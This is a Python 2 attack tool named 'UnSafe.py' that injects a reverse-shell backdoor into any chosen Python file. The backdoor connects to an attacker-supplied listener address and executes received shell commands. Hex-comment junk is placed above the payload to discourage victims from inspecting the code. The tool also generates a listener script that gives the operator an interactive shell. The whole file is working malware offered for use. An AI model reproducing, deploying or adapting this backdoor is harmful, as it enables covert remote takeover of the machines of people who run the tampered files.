
import sys
print """        
                                                      
  __  __     __   __     ______     ______     ______   ______    
/\ \/\ \   /\ "-.\ \   /\  ___\   /\  __ \   /\  ___\ /\  ___\   
\ \ \_\ \  \ \ \-.  \  \ \___  \  \ \  __ \  \ \  __\ \ \  __\   
 \ \_____\  \ \_\\"\_\  \/\_____\  \ \_\ \_\  \ \_\    \ \_____\ 
  \/_____/   \/_/ \/_/   \/_____/   \/_/\/_/   \/_/     \/_____/ 
                                                                                                                   
						   """
help = """
Original Software By NSK B3. 
Drop A Backdoor into ANY Python files you want!
This Generates A Server File As Well :)
------------------------------------------------------------

Usage:
python UnSafe.py [FILE] [LHOST]

_______________________________________________________________________.
FILE: File To Put A Backdoor into. [NOTE] Only .py Files Are Supported!|
                                                                       |
LHOST: The Listener Address                                            |
_______________________________________________________________________|

"""
def cli():
	global lhost, file
	try:
		file = sys.argv[1]
		lhost = sys.argv[2]
	except:
		print(help)
		quit()
def inject_backdoor():
	try:
		f = open(file, 'r')
	except:
		print("File %s not found!" % file)
		quit()
	if '.py' in file:
		pass
	else:
		print("The Given File Isn't A Python File!")
		quit()
	original_content = f.read()
	code = '''
#Code
#74 68 69 
#73 20 68 
#65 78 61 
#64 65 63 69 
#6d 61 6c 
#20 69 73 
#20 75 73 
#65 64 
#20 74 6f 
#20 6d 61 
#6b 65 20
#74 68 65 
#20 76 69 
#63 74 69 
#6d 20 74 
#68 69 6e 
#6b 20 74
#68 61 74 20 74 6
#8 69 73 20 6
#3 6f 64 65 20 69 73 2
#0 73 61 66 65 2c 20 77 68 65 6e 20 
#74 68 65 79 20 6c 6f 6f 6b 20 69
#6e 74 6f 2
#0 69 74 2e 20 44 6f
#70 65 2e
####################
####################
####################
####################
####################
####################
#@@@@@@@@@@@@@@@@@@#
#@&$#|>#&\#&@#&>#&##
#Random HEX and Characters above, were added in case the victim looks into the code of the backdoored file 
#and they won't try to look into the source code as they see loads of weird meaningless code. SE Evasion
import socket, subprocess
print "Loading, DO NOT EXIT THIS APPLICATION!"
host = "%s"\nport = 51949
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
	data = s.recv(65536)
	if 'quit' in data:
		quit()
	else:
		CMD = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		s.sendall(CMD.stdout.read())
		s.sendall(CMD.stderr.read())

\n''' % lhost
	BACKDOORED_CODE = code + str(original_content)
	wf = open(file, 'w')
	wf.write(BACKDOORED_CODE)
	file2 = open("reverse_tcp_server.py", "w")
        file2.write('''
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 51949
s.bind(("", port))
s.listen(50)
print "{+} TCP Server Started, waiting for client to connect..."
conn, addr = s.accept()
print "{*} Session Opened by Victim. PORT:",port
def command():
	while True:
		command = raw_input("[*] session@shell:~# ")
		if 'quit' in command:
			conn.send('quit')
			conn.close()
			s.close()
			quit()
		else:
			conn.send(command)
			print conn.recv(65536)
command()
''')
	print("File Successfully Backdoored!")

if __name__ == '__main__':
	cli()
	inject_backdoor()

